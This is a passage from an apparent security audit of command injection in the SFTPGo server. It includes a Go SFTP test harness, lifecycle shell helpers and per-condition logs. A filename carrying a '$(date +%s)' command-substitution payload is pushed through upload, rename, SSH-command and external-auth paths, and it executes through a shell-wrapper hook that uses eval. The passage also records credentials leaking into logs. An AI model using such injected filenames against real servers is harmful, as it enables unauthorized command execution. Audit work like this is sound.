		if err != nil {
			fail("sftp Create failed", err)
		}
		n, err := f.Write([]byte("audit-payload-20byt"))
		if err != nil {
			fail("sftp Write failed", err)
		}
		fmt.Printf(">> wrote %d bytes to the remote file\n", n)
		if err := f.Close(); err != nil {
			fail("sftp Close failed", err)
		}
		fmt.Println(">> f.Close() OK -> upload COMPLETED (fires the upload action)")
		listRoot(sc)
		fmt.Println("harness exit=0")

	case "rename":
		src, dst := os.Args[2], os.Args[3]
		sc, err := sftp.NewClient(client)
		if err != nil {
			fail("sftp.NewClient failed", err)
		}
		defer sc.Close()
		fmt.Println(">> SFTP subsystem opened (github.com/pkg/sftp)")
		fmt.Printf(">> creating source %q then renaming to %q\n", src, dst)
		f, err := sc.Create(src)
		if err != nil {
			fail("sftp Create(src) failed", err)
		}
		f.Write([]byte("audit-payload-20byt"))
		f.Close()
		fmt.Println(">> source created + closed (upload of source completes)")
		if err := sc.Rename(src, dst); err != nil {
			fail("sftp Rename failed", err)
		}
		fmt.Printf(">> Rename(%q -> %q) OK -> fires the rename action\n", src, dst)
		listRoot(sc)
		fmt.Println("harness exit=0")

	case "sshcmd":
		cmd := strings.Join(os.Args[2:], " ")
		sess, err := client.NewSession()
		if err != nil {
			fail("NewSession failed", err)
		}
		defer sess.Close()
		fmt.Println(">> opening SSH session (exec channel), NOT the SFTP subsystem")
		fmt.Printf(">> session.Run(%q) — drives sftpd/ssh_cmd.go processSSHCommand\n", cmd)
		var out bytes.Buffer
		sess.Stdout = &out
		sess.Stderr = &out
		runErr := sess.Run(cmd)
		fmt.Printf(">> combined output (%d bytes): %q\n", out.Len(), out.String())
		if runErr != nil {
			fmt.Printf(">> session exited with ERROR: %v\n", runErr)
		} else {
			fmt.Println(">> session exited cleanly (no error)")
		}
		fmt.Println("harness exit=0")

	default:
		fmt.Printf("unknown mode %q\n", mode)
		os.Exit(2)
	}
}

func listRoot(sc *sftp.Client) {
	fmt.Println(">> listing remote root after operation:")
	entries, err := sc.ReadDir(".")
	if err != nil {
		fmt.Printf("   (ReadDir error: %v)\n", err)
		return
	}
	for _, e := range entries {
		fmt.Printf("   remote: %q size=%d mode=%v\n", e.Name(), e.Size(), e.Mode())
	}
	_ = io.EOF
}
```

### 6.6 `lib.sh` — server lifecycle & bounded polling

Sourced by each condition runner. It forces the log path absolute (so logs never land in the repo), binds loopback only, tracks the exact PID for a precise kill (never `pkill`/`killall`), and provides a **bounded** `poll_log` used to wait for the asynchronous hook goroutine to complete (addresses the race/TOCTOU concern for Site A's `go executeAction(...)`).

```sh
# lib.sh — server lifecycle + polling helpers for the SFTPGo command-injection audit.
# Sourced by each condition runner. All servers bind LOOPBACK ONLY and are tracked by
# exact PID so they can be killed precisely (never pkill/killall). The log file path is
# forced ABSOLUTE (SFTPGO_LOG_FILE_PATH) so it is always written under /tmp/sftpgo_run
# regardless of the current working directory (never into the repo).
RUN=/tmp/sftpgo_run
BIN=/tmp/sftpgo_bin
LOG="$RUN/sftpgo.log"

# start_server "<ENV assignments>"  -> starts server with fresh logs, waits for :2022 listener
start_server() {
    local envassign="$1"
    rm -f "$LOG" "$RUN/console.log"
    # shellcheck disable=SC2086
    env SFTPGO_LOG_FILE_PATH="$LOG" $envassign nohup "$BIN" serve -c "$RUN" > "$RUN/console.log" 2>&1 &
    SRV=$!
    local i
    for i in $(seq 1 30); do
        if awk '$2 ~ /:07E6$/ && $4=="0A"{f=1} END{exit !f}' /proc/net/tcp; then sleep 0.3; return 0; fi
        sleep 0.5
    done
    echo "!! server did not bind :2022 (pid=$SRV)"; return 1
}

# stop_server -> kills exactly the PID we started, verifies it is gone
stop_server() {
    [ -n "$SRV" ] || return 0
    kill "$SRV" 2>/dev/null
    local i
    for i in $(seq 1 20); do kill -0 "$SRV" 2>/dev/null || break; sleep 0.25; done
    if kill -0 "$SRV" 2>/dev/null; then echo "!! PID $SRV still alive"; else echo "server pid=$SRV stopped"; fi
    SRV=""
}

# poll_log <timeout_s> <pattern> -> waits up to <timeout_s> for <pattern> in the server log.
# returns 0 if it appears, 1 on timeout (bounds async goroutine completion).
poll_log() {
    local timeout="$1" pat="$2" i
    for i in $(seq 1 $((timeout*4))); do
        grep -q "$pat" "$LOG" 2>/dev/null && return 0
        sleep 0.25
    done
    return 1
}

show_listener() { awk 'NR==1 || ($2 ~ /:07E6$/ && $4=="0A")' /proc/net/tcp; }
show_artifacts() { ls -la /tmp/audit_*.txt 2>&1; }
```

The canonical malicious input, unchanged across every condition, is the filename:

```
audit_$(date +%s).txt          # length 21 bytes
```

---

## 7. Conditions and complete evidence

Each condition ran ≥2 trials with the same unchanged payload. Trial IDs are the server-side SSH `connection_id` (Sites A/B/C) or the REST call + timestamp (Site D). Before each trial the log offset is reset (`: > "$LOG"`) and the async hook is awaited with the bounded `poll_log`.

### 7.1 Condition C1 — default configuration (empty hook) → nothing executes [OBSERVED]

Command (representative, trial 1 of 2):

```
$ export AUDIT_HOST=127.0.0.1:2022 AUDIT_USER=audituser AUDIT_PASS=$(cat /tmp/audit_evidence/cred.txt)
$ /tmp/sftp_harness upload 'audit_$(date +%s).txt'
```

Complete SFTP transcript (trial 1 and trial 2 were byte-identical):

```
>> connecting to 127.0.0.1:2022 as "audituser" over the real SSH transport (golang.org/x/crypto/ssh)
>> SSH handshake + password auth SUCCEEDED
>> SFTP subsystem opened (github.com/pkg/sftp)
>> payload filename (verbatim, len=21) = "audit_$(date +%s).txt"
>> wrote 19 bytes to the remote file
>> f.Close() OK -> upload COMPLETED (fires the upload action)
>> listing remote root after operation:
   remote: "audit_$(date +%s).txt" size=19 mode=-rw-r--r--
harness exit=0
```

Server-side executed-command count (both trials): **0**. The uploaded file exists in the user's home with the literal name (owned by the mapped uid/gid 1000, i.e. `ubuntu`), confirming the payload survives as literal bytes even with no hook:

```
$ ls -la /tmp/sftpgo_run/home_audituser
total 12
drwxr-xr-x 2 root   root   4096 Jul 13 18:32 .
drwxr-xr-x 3 root   root   4096 Jul 13 18:33 ..
-rw-r--r-- 1 ubuntu ubuntu   19 Jul 13 18:33 audit_$(date +%s).txt
```

No `/tmp/audit_*.txt` was created. **Guard reached:** `sftpd/sftpd.go:439` (operation not in the empty `ExecuteOn` list). Verdict: **not vulnerable**.

### 7.2 Conditions C1b / C1c / C1d — guard variants (each must block) [OBSERVED]

Runner (each variant sets only the named override, then uploads the same payload twice):

```
run_guard() {
  local tag="$1"; local envassign="$2"
  rm -f /tmp/audit_*.txt
  start_server "$envassign"
  cp "$LOG" /tmp/audit_evidence/${tag}_startup.txt
  for T in 1 2; do
    : > "$LOG"
    /tmp/sftp_harness upload 'audit_$(date +%s).txt' >/dev/null 2>&1
    sleep 1
    echo "  trial $T: executed-command lines=$(grep -ac 'executed command' "$LOG")"
    cp "$LOG" /tmp/audit_evidence/${tag}_t${T}_serverlog.txt
  done
  echo "  artifact: $(ls /tmp/audit_*.txt 2>/dev/null || echo NONE)"
  stop_server
}
run_guard C1b "SFTPGO_SFTPD__ACTIONS__COMMAND=/tmp/hook_direct"
run_guard C1c "SFTPGO_SFTPD__ACTIONS__EXECUTE_ON=upload,rename,delete,download"
run_guard C1d "SFTPGO_SFTPD__ACTIONS__COMMAND=hook_direct SFTPGO_SFTPD__ACTIONS__EXECUTE_ON=upload,rename,delete,download"
```

The complete `config loaded` line from each variant's startup log (the exact loaded configuration, verbatim), followed by that variant's per-trial executed-command counts.

**C1b** — `command` set to an absolute binary, but `execute_on` empty ⇒ GUARD1 (`sftpd/sftpd.go:439`). The loaded config shows `Actions:{ExecuteOn:[] Command:/tmp/hook_direct HTTPNotificationURL:}`:

```
{"level":"debug","time":"2026-07-13T18:50:45.571","sender":"config","connection_id":"","message":"config file used: '/tmp/sftpgo_run/sftpgo.json', config loaded: {SFTPD:{Banner:SFTPGo_0.9.5-dev BindPort:2022 BindAddress:127.0.0.1 IdleTimeout:15 MaxAuthTries:0 Umask:0022 UploadMode:0 Actions:{ExecuteOn:[] Command:/tmp/hook_direct HTTPNotificationURL:} Keys:[] IsSCPEnabled:false KexAlgorithms:[] Ciphers:[] MACs:[] LoginBannerFile: SetstatMode:0 EnabledSSHCommands:[md5sum sha1sum cd pwd]} ProviderConf:{Driver:sqlite Name:sftpgo.db Host: Port:5432 Username: Password:[redacted] SSLMode:0 ConnectionString: UsersTable:users ManageUsers:1 TrackQuota:2 PoolSize:0 UsersBaseDir: Actions:{ExecuteOn:[] Command: HTTPNotificationURL:} ExternalAuthProgram: ExternalAuthScope:0} HTTPDConfig:{BindPort:8080 BindAddress:127.0.0.1 TemplatesPath:/tmp/blitzy/sftpgo/blitzy-423fd863-6472-4e13-8c23-845807342f92_7ab63a/templates StaticFilesPath:/tmp/blitzy/sftpgo/blitzy-423fd863-6472-4e13-8c23-845807342f92_7ab63a/static BackupsPath:backups}}"}
  trial 1: executed-command lines=0
  trial 2: executed-command lines=0
  artifact: NONE
```

**C1c** — `execute_on` set, but `command` empty ⇒ GUARD2 (`sftpd/sftpd.go:447`, `len==0`). The loaded config shows `Actions:{ExecuteOn:[upload rename delete download] Command: HTTPNotificationURL:}`:

```
{"level":"debug","time":"2026-07-13T18:50:49.089","sender":"config","connection_id":"","message":"config file used: '/tmp/sftpgo_run/sftpgo.json', config loaded: {SFTPD:{Banner:SFTPGo_0.9.5-dev BindPort:2022 BindAddress:127.0.0.1 IdleTimeout:15 MaxAuthTries:0 Umask:0022 UploadMode:0 Actions:{ExecuteOn:[upload rename delete download] Command: HTTPNotificationURL:} Keys:[] IsSCPEnabled:false KexAlgorithms:[] Ciphers:[] MACs:[] LoginBannerFile: SetstatMode:0 EnabledSSHCommands:[md5sum sha1sum cd pwd]} ProviderConf:{Driver:sqlite Name:sftpgo.db Host: Port:5432 Username: Password:[redacted] SSLMode:0 ConnectionString: UsersTable:users ManageUsers:1 TrackQuota:2 PoolSize:0 UsersBaseDir: Actions:{ExecuteOn:[] Command: HTTPNotificationURL:} ExternalAuthProgram: ExternalAuthScope:0} HTTPDConfig:{BindPort:8080 BindAddress:127.0.0.1 TemplatesPath:/tmp/blitzy/sftpgo/blitzy-423fd863-6472-4e13-8c23-845807342f92_7ab63a/templates StaticFilesPath:/tmp/blitzy/sftpgo/blitzy-423fd863-6472-4e13-8c23-845807342f92_7ab63a/static BackupsPath:backups}}"}
  trial 1: executed-command lines=0
  trial 2: executed-command lines=0
  artifact: NONE
```

**C1d** — `execute_on` set, `command` RELATIVE (`hook_direct`) ⇒ GUARD2 (`sftpd/sftpd.go:447`, `!filepath.IsAbs`). The loaded config shows `Actions:{ExecuteOn:[upload rename delete download] Command:hook_direct HTTPNotificationURL:}`:

```
{"level":"debug","time":"2026-07-13T18:50:52.584","sender":"config","connection_id":"","message":"config file used: '/tmp/sftpgo_run/sftpgo.json', config loaded: {SFTPD:{Banner:SFTPGo_0.9.5-dev BindPort:2022 BindAddress:127.0.0.1 IdleTimeout:15 MaxAuthTries:0 Umask:0022 UploadMode:0 Actions:{ExecuteOn:[upload rename delete download] Command:hook_direct HTTPNotificationURL:} Keys:[] IsSCPEnabled:false KexAlgorithms:[] Ciphers:[] MACs:[] LoginBannerFile: SetstatMode:0 EnabledSSHCommands:[md5sum sha1sum cd pwd]} ProviderConf:{Driver:sqlite Name:sftpgo.db Host: Port:5432 Username: Password:[redacted] SSLMode:0 ConnectionString: UsersTable:users ManageUsers:1 TrackQuota:2 PoolSize:0 UsersBaseDir: Actions:{ExecuteOn:[] Command: HTTPNotificationURL:} ExternalAuthProgram: ExternalAuthScope:0} HTTPDConfig:{BindPort:8080 BindAddress:127.0.0.1 TemplatesPath:/tmp/blitzy/sftpgo/blitzy-423fd863-6472-4e13-8c23-845807342f92_7ab63a/templates StaticFilesPath:/tmp/blitzy/sftpgo/blitzy-423fd863-6472-4e13-8c23-845807342f92_7ab63a/static BackupsPath:backups}}"}
  trial 1: executed-command lines=0
  trial 2: executed-command lines=0
  artifact: NONE
```

All three block execution; no artifact in any trial. These prove the two guards independently, and in particular that a **relative** command path is refused by `filepath.IsAbs` (C1d) — matching README.md:144/179 ("Absolute path to the command to execute. Leave empty to disable.").

### 7.3 Condition C2 — direct-binary hook fires, payload stays literal [OBSERVED]

The hook is wired to the absolute path of the direct binary and `execute_on` includes `upload`:

```
$ start_server "SFTPGO_SFTPD__ACTIONS__COMMAND=/tmp/hook_direct SFTPGO_SFTPD__ACTIONS__EXECUTE_ON=upload,rename,delete,download"
$ /tmp/sftp_harness upload 'audit_$(date +%s).txt'
```

SFTP transcript (trial 1; trial 2 identical):

```
>> connecting to 127.0.0.1:2022 as "audituser" over the real SSH transport (golang.org/x/crypto/ssh)
>> SSH handshake + password auth SUCCEEDED
>> SFTP subsystem opened (github.com/pkg/sftp)
>> payload filename (verbatim, len=21) = "audit_$(date +%s).txt"
>> wrote 19 bytes to the remote file
>> f.Close() OK -> upload COMPLETED (fires the upload action)
>> listing remote root after operation:
   remote: "audit_$(date +%s).txt" size=19 mode=-rw-r--r--
harness exit=0
```

Server DEBUG audit line from **`sftpd/sftpd.go:432`** — trial 1 then trial 2 (note the payload is a single Go-quoted literal token; both trials have the same shape, differing only in timestamp/elapsed):

```
{"level":"debug","time":"2026-07-13T18:34:49.949","sender":"sftpd","connection_id":"","message":"executed command \"/tmp/hook_direct\" with arguments: \"upload\", \"audituser\", \"/tmp/sftpgo_run/home_audituser/audit_$(date +%s).txt\", \"\", \"\", elapsed: 2.152802ms, error: <nil>"}
{"level":"debug","time":"2026-07-13T18:34:50.163","sender":"sftpd","connection_id":"","message":"executed command \"/tmp/hook_direct\" with arguments: \"upload\", \"audituser\", \"/tmp/sftpgo_run/home_audituser/audit_$(date +%s).txt\", \"\", \"\", elapsed: 2.340239ms, error: <nil>"}
```

The hook's own record (both invocations), proving the value arrived as a literal and that the hook created a file whose name still contains the *unexpanded* `$(date +%s)`:

```
=== hook_direct fired ===
uid=0 euid=0 gid=0 egid=0
argv (os.Args) = []string{"/tmp/hook_direct", "upload", "audituser", "/tmp/sftpgo_run/home_audituser/audit_$(date +%s).txt", "", ""}
SFTPGO_ACTION_PATH = "/tmp/sftpgo_run/home_audituser/audit_$(date +%s).txt"
creating (Go os.Create, NO shell) target = "/tmp/audit_$(date +%s).txt"
wrote CONFIRMED to "/tmp/audit_$(date +%s).txt"
=== hook_direct fired ===
uid=0 euid=0 gid=0 egid=0
argv (os.Args) = []string{"/tmp/hook_direct", "upload", "audituser", "/tmp/sftpgo_run/home_audituser/audit_$(date +%s).txt", "", ""}
SFTPGO_ACTION_PATH = "/tmp/sftpgo_run/home_audituser/audit_$(date +%s).txt"
creating (Go os.Create, NO shell) target = "/tmp/audit_$(date +%s).txt"
wrote CONFIRMED to "/tmp/audit_$(date +%s).txt"
```

**Key result:** the hook *did* fire (SFTPGo executed it), yet because neither SFTPGo nor the direct hook used a shell, the created filename is the **literal** `/tmp/audit_$(date +%s).txt` — the command substitution was never performed. A scanner watching for `/tmp/audit_<epoch>.txt` would see **no** epoch-named file → **not vulnerable**, even though a hook ran.

### 7.4 Condition C2-rename — Site A also fires on SFTP rename [OBSERVED]

Driving `handler.go:317` via a real SFTP rename (same direct hook):

```
$ /tmp/sftp_harness rename 'audit_$(date +%s).txt' 'renamed_dest_1.txt'
```

Transcript (trial 1):

```
>> connecting to 127.0.0.1:2022 as "audituser" over the real SSH transport (golang.org/x/crypto/ssh)
>> SSH handshake + password auth SUCCEEDED
>> SFTP subsystem opened (github.com/pkg/sftp)
>> creating source "audit_$(date +%s).txt" then renaming to "renamed_dest_1.txt"
>> source created + closed (upload of source completes)
>> Rename("audit_$(date +%s).txt" -> "renamed_dest_1.txt") OK -> fires the rename action
>> listing remote root after operation:
   remote: "renamed_dest_1.txt" size=19 mode=-rw-r--r--
harness exit=0
```

DEBUG lines (trial 1 → `renamed_dest_1.txt`, trial 2 → `renamed_dest_2.txt`); the source path still carries the literal payload:

```
{"level":"debug","time":"2026-07-13T18:36:09.879","sender":"sftpd","connection_id":"","message":"executed command \"/tmp/hook_direct\" with arguments: \"rename\", \"audituser\", \"/tmp/sftpgo_run/home_audituser/audit_$(date +%s).txt\", \"/tmp/sftpgo_run/home_audituser/renamed_dest_1.txt\", \"\", elapsed: 2.092299ms, error: <nil>"}
{"level":"debug","time":"2026-07-13T18:36:10.071","sender":"sftpd","connection_id":"","message":"executed command \"/tmp/hook_direct\" with arguments: \"rename\", \"audituser\", \"/tmp/sftpgo_run/home_audituser/audit_$(date +%s).txt\", \"/tmp/sftpgo_run/home_audituser/renamed_dest_2.txt\", \"\", elapsed: 2.171089ms, error: <nil>"}
```

No epoch-named artifact (direct hook). Confirms the rename caller (`sftpd/handler.go:317`) reaches Site A identically to upload. Because each trial first *creates* the source file and then renames it, Site A fires **twice** per trial: the source-file close first triggers an **upload** action (`sftpd/transfer.go:156`) that emits its own `executed command` DEBUG line — of the same form shown in §7.3 (C2) — immediately before the **rename** action (`sftpd/handler.go:317`) shown above. Those intervening upload lines are elided from the block above to keep the focus on the rename caller; both were present at runtime (one `upload` line then one `rename` line per trial, with the payload delivered literally in each).

### 7.5 Condition C3 — shell-wrapper hook → VULNERABLE (the exploit) [OBSERVED]

The **only** change versus C2 is that `actions.command` now points at the shell wrapper `/tmp/hook_shell.sh`:

```
$ start_server "SFTPGO_SFTPD__ACTIONS__COMMAND=/tmp/hook_shell.sh SFTPGO_SFTPD__ACTIONS__EXECUTE_ON=upload,rename,delete,download"
$ /tmp/sftp_harness upload 'audit_$(date +%s).txt'   # trial 1
$ sleep 2
$ /tmp/sftp_harness upload 'audit_$(date +%s).txt'   # trial 2 (2s later)
```

SFTP transcript (trial 1; the remote listing also shows leftover files from the prior rename condition in the shared home — harmless):

```
>> connecting to 127.0.0.1:2022 as "audituser" over the real SSH transport (golang.org/x/crypto/ssh)
>> SSH handshake + password auth SUCCEEDED
>> SFTP subsystem opened (github.com/pkg/sftp)
>> payload filename (verbatim, len=21) = "audit_$(date +%s).txt"
>> wrote 19 bytes to the remote file
>> f.Close() OK -> upload COMPLETED (fires the upload action)
>> listing remote root after operation:
   remote: "audit_$(date +%s).txt" size=19 mode=-rw-r--r--
   remote: "renamed_dest_1.txt" size=19 mode=-rw-r--r--
   remote: "renamed_dest_2.txt" size=19 mode=-rw-r--r--
harness exit=0
```

Server DEBUG audit line from `sftpd/sftpd.go:432` — trial 1 then trial 2. **Compare to C2 in §7.3: the shape is identical; only the command path differs.** SFTPGo behaves the same; the difference is entirely in the hook program:

```
{"level":"debug","time":"2026-07-13T18:36:37.195","sender":"sftpd","connection_id":"","message":"executed command \"/tmp/hook_shell.sh\" with arguments: \"upload\", \"audituser\", \"/tmp/sftpgo_run/home_audituser/audit_$(date +%s).txt\", \"\", \"\", elapsed: 9.258008ms, error: <nil>"}
{"level":"debug","time":"2026-07-13T18:36:39.683","sender":"sftpd","connection_id":"","message":"executed command \"/tmp/hook_shell.sh\" with arguments: \"upload\", \"audituser\", \"/tmp/sftpgo_run/home_audituser/audit_$(date +%s).txt\", \"\", \"\", elapsed: 8.949513ms, error: <nil>"}
```

The hook's own record (both trials) — the guard matched and `eval` ran, i.e. *the hook's shell* performed the substitution:

```
[hook_shell] fired: euid=0 argv3=/tmp/sftpgo_run/home_audituser/audit_$(date +%s).txt SFTPGO_ACTION_PATH=/tmp/sftpgo_run/home_audituser/audit_$(date +%s).txt basename=audit_$(date +%s).txt
[hook_shell] GUARD matched expected payload -> eval executed
[hook_shell] fired: euid=0 argv3=/tmp/sftpgo_run/home_audituser/audit_$(date +%s).txt SFTPGO_ACTION_PATH=/tmp/sftpgo_run/home_audituser/audit_$(date +%s).txt basename=audit_$(date +%s).txt
[hook_shell] GUARD matched expected payload -> eval executed
```

**The target artifacts were created** — two files with **expanded** epoch-second names (distinct because the two trials ran two seconds apart), each containing `CONFIRMED`:

```
$ ls -la --time-style=+%Y-%m-%dT%H:%M:%S /tmp/audit_*.txt
-rw-r--r-- 1 root root 10 2026-07-13T18:36:37 /tmp/audit_1783967797.txt
-rw-r--r-- 1 root root 10 2026-07-13T18:36:39 /tmp/audit_1783967799.txt
$ cat /tmp/audit_1783967797.txt /tmp/audit_1783967799.txt
CONFIRMED
CONFIRMED
```

Verdict: **VULNERABLE**. This satisfies the user's exploitation goal (§8).

### 7.6 Condition C4 — Site C external authentication (env-only) [OBSERVED]

Site C receives credentials via environment only. To reproduce the sensitive error-path log **safely**, the server is launched with a clean environment (`env -i`) plus a clearly-marked synthetic canary; the login username/password are the payload strings themselves. The external-auth program records its inputs and exits non-zero so SFTPGo takes the error path at `dataprovider/dataprovider.go:748-749`.

```
$ env -i PATH=/usr/bin:/bin:/usr/local/bin HOME=/tmp CANARY_SECRET="SYNTHETIC-CANARY-not-a-real-secret-4a9f2c" \
      SFTPGO_LOG_FILE_PATH=/tmp/sftpgo_run/sftpgo.log \
      SFTPGO_DATA_PROVIDER__EXTERNAL_AUTH_PROGRAM=/tmp/extauth_prog \
      nohup /tmp/sftpgo_bin serve -c /tmp/sftpgo_run > /tmp/sftpgo_run/console.log 2>&1 &
$ AUDIT_USER='audit_$(date +%s).txt' AUDIT_PASS='pw_$(date +%s)' /tmp/sftp_harness login   # trial 1 of 2
```

Client transcript (trial 1) — the login fails, which is expected (the program exits 1):

```
>> connecting to 127.0.0.1:2022 as "audit_$(date +%s).txt" over the real SSH transport (golang.org/x/crypto/ssh)
!! auth/handshake result: ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain
harness exit=1
```

Server log — the error path at `dataprovider/dataprovider.go:749` dumps the **entire** `cmd.Env` (the format string is `"External auth error: %v env: %+v"`). Because we used `env -i`, the dump is safe and self-contained; the credentials appear as literal, unexpanded env values (`SFTPGO_AUTHD_USERNAME` / `SFTPGO_AUTHD_PASSWORD`), confirming the env-only channel:

```
{"level":"debug","time":"2026-07-13T18:43:44.341","sender":"connection_failed","client_ip":"127.0.0.1","username":"audit_$(date +%s).txt","login_type":"password","error":"External auth error: exit status 1 env: [PATH=/usr/bin:/bin:/usr/local/bin HOME=/tmp CANARY_SECRET=SYNTHETIC-CANARY-not-a-real-secret-4a9f2c SFTPGO_LOG_FILE_PATH=/tmp/sftpgo_run/sftpgo.log SFTPGO_DATA_PROVIDER__EXTERNAL_AUTH_PROGRAM=/tmp/extauth_prog SFTPGO_AUTHD_USERNAME=audit_$(date +%s).txt SFTPGO_AUTHD_PASSWORD=pw_$(date +%s) SFTPGO_AUTHD_PUBLIC_KEY=]"}
{"level":"warn","time":"2026-07-13T18:43:44.341","sender":"sftpd","connection_id":"","message":"failed to accept an incoming connection: [ssh: no auth passed yet, Authentication error: could not validate password credentials: External auth error: exit status 1 env: [PATH=/usr/bin:/bin:/usr/local/bin HOME=/tmp CANARY_SECRET=SYNTHETIC-CANARY-not-a-real-secret-4a9f2c SFTPGO_LOG_FILE_PATH=/tmp/sftpgo_run/sftpgo.log SFTPGO_DATA_PROVIDER__EXTERNAL_AUTH_PROGRAM=/tmp/extauth_prog SFTPGO_AUTHD_USERNAME=audit_$(date +%s).txt SFTPGO_AUTHD_PASSWORD=pw_$(date +%s) SFTPGO_AUTHD_PUBLIC_KEY=]]"}
```

The external-auth program's own record — **`argv_count(excl argv0)=0`** confirms *no positional attacker arguments*; the payload lives purely in env:

```
argv0=/tmp/extauth_prog
argv_count(excl argv0)=0
euid=0 egid=0
SFTPGO_AUTHD_USERNAME=audit_$(date +%s).txt
SFTPGO_AUTHD_PASSWORD=pw_$(date +%s)
SFTPGO_AUTHD_PUBLIC_KEY=
CANARY_SECRET_seen=SYNTHETIC-CANARY-not-a-real-secret-4a9f2c
```

No `/tmp/audit_*.txt` created. **Security note (env-var exposure):** the `%+v` dump at `dataprovider.go:749` leaks the *entire* process environment — including the plaintext credentials — into the log on every auth failure. That is a real information-disclosure observation (distinct from command injection); it does not, by itself, execute anything.

### 7.7 Condition C5 — Site B SSH system commands (argument injection, not substitution) [OBSERVED]

Site B whitelists the command **name** at `sftpd/ssh_cmd.go:51`. The supported sets are declared verbatim at `sftpd/sftpd.go:66-70`:

```go
	supportedSSHCommands = []string{"scp", "md5sum", "sha1sum", "sha256sum", "sha384sum", "sha512sum", "cd", "pwd",
		"git-receive-pack", "git-upload-pack", "git-upload-archive", "rsync"}
	defaultSSHCommands = []string{"md5sum", "sha1sum", "cd", "pwd"}
	sshHashCommands    = []string{"md5sum", "sha1sum", "sha256sum", "sha384sum", "sha512sum"}
	systemCommands     = []string{"git-receive-pack", "git-upload-pack", "git-upload-archive", "rsync"}
```

Of these, `sshHashCommands` are handled **internally** (Go crypto), `cd`/`pwd` are handled internally, and only `systemCommands` (`git-receive-pack`, `git-upload-pack`, `git-upload-archive`, `rsync`) reach `exec.Command` at `sftpd/ssh_cmd.go:324`.

**(a) A non-whitelisted command name is rejected before any exec.** Running the `touch` command (exact invocation in the code block below):

```
$ /tmp/sftp_harness sshcmd 'touch /tmp/audit_$(date +%s).txt'
```

Server log — the name is parsed, then refused (`sftpd/ssh_cmd.go:51`); nothing is executed:

```
{"level":"debug","time":"2026-07-13T18:38:35.799","sender":"ssh","connection_id":"1f2ab07ee4400ebcff10d07ff09f3ffee76e4a922a13f16d7348d6b3316129ae","message":"new ssh command: \"touch\" args: [/tmp/audit_$(date +%s).txt] user: audituser, error: <nil>"}
{"level":"info","time":"2026-07-13T18:38:35.799","sender":"ssh","connection_id":"1f2ab07ee4400ebcff10d07ff09f3ffee76e4a922a13f16d7348d6b3316129ae","message":"ssh command not enabled/supported: \"touch\""}
```

Client transcript:

```
>> session.Run("touch /tmp/audit_$(date +%s).txt") — drives sftpd/ssh_cmd.go processSSHCommand
>> combined output (0 bytes): ""
>> session exited with ERROR: ssh: command touch /tmp/audit_$(date +%s).txt failed
```

**(b) The payload is whitespace-tokenized, so the command NAME becomes `$(date`.** Sending the bare payload as a command:

```
{"level":"debug","time":"2026-07-13T18:38:36.114","sender":"ssh","connection_id":"fb13b2d8dd86214e6c9933813aee8911d7d0e7b7d8ab4aedd201c29780e69582","message":"new ssh command: \"$(date\" args: [+%s)] user: audituser, error: <nil>"}
{"level":"info","time":"2026-07-13T18:38:36.114","sender":"ssh","connection_id":"fb13b2d8dd86214e6c9933813aee8911d7d0e7b7d8ab4aedd201c29780e69582","message":"ssh command not enabled/supported: \"$(date\""}
```

`parseCommandPayload` (`sftpd/ssh_cmd.go:423`) split on spaces, yielding name `$(date` and arg `+%s)`; the name fails the whitelist. There is no shell to reassemble or expand it.

**(c) `md5sum` is handled INTERNALLY — it never reaches `exec.Command`.** With `md5sum` enabled by default:

```
{"level":"debug","time":"2026-07-13T18:38:36.278","sender":"ssh","connection_id":"12b2d288fcb448cad2e7b8e0c76d0981d348cfd477b2817ee4d915859db0f897","message":"new ssh command: \"md5sum\" args: [] user: audituser, error: <nil>"}
```

Count of "new system command" lines for this session: **0**. This corrects a prior mischaracterization: `md5sum`/`sha1sum`/`sha256sum`/`sha384sum`/`sha512sum` are computed with Go's crypto libraries inside SFTPGo (README.md:156 — "implemented inside SFTPGo"), so they are **not** a subprocess-execution surface at all.

**(d) Enabling `rsync` reaches the REAL `exec.Command` at `sftpd/ssh_cmd.go:324`.** With `enabled_ssh_commands` extended:

```
$ start_server "SFTPGO_SFTPD__ENABLED_SSH_COMMANDS=md5sum,sha1sum,cd,pwd,rsync,git-upload-pack"
$ /tmp/sftp_harness sshcmd 'rsync audit_$(date +%s).txt'   # trial 1 of 2
```

Server log (trial 1 then trial 2) — note the **two** DEBUG lines: the whitelist-passing name at `ssh_cmd.go:49`, then the system-command dispatch at `ssh_cmd.go:323`. The `$(date +%s)` name has been whitespace-tokenized into separate `argv` elements (`audit_$(date` and `+%s).txt`, the latter resolved as a path under the home dir), and `--safe-links` was auto-prepended:

```
{"level":"debug","time":"2026-07-13T18:39:21.414","sender":"ssh","connection_id":"8dc153694175aa0886b7256b2d3bbe98d2952ef659ff42cb35daa2cbdd8b2d4f","message":"new ssh command: \"rsync\" args: [audit_$(date +%s).txt] user: audituser, error: <nil>"}
{"level":"debug","time":"2026-07-13T18:39:21.415","sender":"ssh","connection_id":"8dc153694175aa0886b7256b2d3bbe98d2952ef659ff42cb35daa2cbdd8b2d4f","message":"new system command \"rsync\", with args: [--safe-links audit_$(date /tmp/sftpgo_run/home_audituser/+%s).txt] path: /tmp/sftpgo_run/home_audituser/+%s).txt"}
{"level":"debug","time":"2026-07-13T18:39:21.735","sender":"ssh","connection_id":"24f77285216f6311322daa8b0250e56735dd2134242e250b0f3fea029a76947f","message":"new ssh command: \"rsync\" args: [audit_$(date +%s).txt] user: audituser, error: <nil>"}
{"level":"debug","time":"2026-07-13T18:39:21.735","sender":"ssh","connection_id":"24f77285216f6311322daa8b0250e56735dd2134242e250b0f3fea029a76947f","message":"new system command \"rsync\", with args: [--safe-links audit_$(date /tmp/sftpgo_run/home_audituser/+%s).txt] path: /tmp/sftpgo_run/home_audituser/+%s).txt"}
```

Client transcript (trial 1) — **`rsync 3.4.1` actually executed** and failed on the literal, unexpanded token, proving real `execve` with no substitution:

```
>> session.Run("rsync audit_$(date +%s).txt") — drives sftpd/ssh_cmd.go processSSHCommand
>> combined output (263 bytes): "rsync: [sender] link_stat \"/tmp/blitzy/sftpgo/blitzy-423fd863-6472-4e13-8c23-845807342f92_7ab63a/audit_$(date\" failed: No such file or directory (2)\nrsync error: some files/attrs were not transferred (see previous errors) (code 23) at main.c(1356) [sender=3.4.1]\n"
>> session exited with ERROR: wait: remote command exited without exit status or exit signal
```

And `git-upload-pack` likewise really executes:

```
